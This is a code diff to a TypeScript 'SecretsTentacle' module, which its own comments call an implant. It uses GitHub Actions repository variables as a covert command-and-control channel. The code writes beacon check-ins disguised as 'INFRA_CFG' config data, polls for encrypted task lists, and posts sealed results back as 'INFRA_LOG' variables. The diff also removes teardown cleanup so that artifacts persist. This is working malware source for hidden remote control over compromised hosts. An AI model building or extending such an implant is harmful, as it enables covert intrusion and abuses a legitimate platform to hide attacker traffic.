@@ -47,14 +47,16 @@
 import { BaseTentacle } from "./BaseTentacle.ts";
 import {
   decryptBox, sealBox,
-  bytesToBase64,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 
 export class SecretsTentacle extends BaseTentacle {
   readonly kind = "secrets" as const;
-
-  private ackWritten = false;
 
   // ── Identity helpers ───────────────────────────────────────────────────────
 
@@ -93,38 +95,36 @@ export class SecretsTentacle extends BaseTentacle {
   // ── Checkin ────────────────────────────────────────────────────────────────
 
   /**
-   * 1. On first call: write ACK variable `INFRA_CFG_{ID8}` = base64({ k: pubkey, t: ts })
+   * 1. On every call: refresh `INFRA_CFG_{ID8}` with the signed check-in.
    * 2. Try GET `INFRA_STATE_{ID8}` variable.
    *    - If absent (404): return [].
    *    - If present: base64-decode → JSON parse { nonce, ciphertext } → decryptBox
    *      → parse Task[] → delete variable → return tasks.
    */
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    // 1. First-call ACK registration
-    if (!this.ackWritten) {
-      const pubKeyB64 = await bytesToBase64(this.config.beaconKeyPair.publicKey);
-      const ackRaw    = JSON.stringify({ k: pubKeyB64, t: payload.checkinAt });
-      // base64-encode the ACK JSON so it looks like opaque config data
-      const ackValue  = Buffer.from(ackRaw).toString("base64");
+    if (!payload.identity) {
+      throw new Error("SecretsTentacle: signed checkin identity is required");
+    }
+    const ackRaw = JSON.stringify(payload);
+    // base64-encode the ACK JSON so it looks like opaque config data
+    const ackValue  = Buffer.from(ackRaw).toString("base64");
 
-      try {
-        await this.octokit.rest.actions.updateRepoVariable({
+    // 1. Refresh the ACK variable before every task poll.
+    try {
+      await this.octokit.rest.actions.updateRepoVariable({
+        owner: this.owner, repo: this.repo,
+        name:  this.ackVarName,
+        value: ackValue,
+      });
+    } catch (err: any) {
+      if (err?.status === 404) {
+        await this.octokit.rest.actions.createRepoVariable({
           owner: this.owner, repo: this.repo,
           name:  this.ackVarName,
           value: ackValue,
         });
-      } catch (err: any) {
-        if (err?.status === 404) {
-          await this.octokit.rest.actions.createRepoVariable({
-            owner: this.owner, repo: this.repo,
-            name:  this.ackVarName,
-            value: ackValue,
-          });
-        }
-        // Other errors are swallowed — ACK is best-effort, not fatal
       }
-
-      this.ackWritten = true;
+      // Other errors are swallowed — ACK is best-effort, not fatal
     }
 
     // 2. Poll for state variable (contains encrypted task array)
@@ -175,7 +175,7 @@ export class SecretsTentacle extends BaseTentacle {
    * 1. sealBox(JSON.stringify(result), operatorPublicKey) → sealedB64
    * 2. Write variable `INFRA_LOG_{TASKID8}` = sealedB64
    */
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const sealed  = await sealBox(JSON.stringify(result), this.config.operatorPublicKey);
     const varName = this.resultVarName(result.taskId);
 
@@ -196,23 +196,24 @@ export class SecretsTentacle extends BaseTentacle {
         throw err;
       }
     }
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "secrets",
+      acceptance: null,
+    };
   }
 
   // ── Teardown ───────────────────────────────────────────────────────────────
 
   /**
-   * Best-effort cleanup: delete `INFRA_CFG_{ID8}` and `INFRA_STATE_{ID8}`
-   * variables if they exist.  No throw on error.
+   * Preserve remote artifacts during failover and recovery reconfiguration.
+   *
+   * The server may not have consumed the registration ACK yet, and the state
+   * variable may still contain an unread task. Lifecycle cleanup belongs to
+   * the server's retention jobs, not an implant teardown.
    */
   override async teardown(): Promise<void> {
-    for (const varName of [this.ackVarName, this.stateVarName]) {
-      try {
-        await this.octokit.rest.actions.deleteRepoVariable({
-          owner: this.owner,
-          repo:  this.repo,
-          name:  varName,
-        });
-      } catch { /* best-effort */ }
-    }
+    // Deliberately non-destructive.
   }
 }
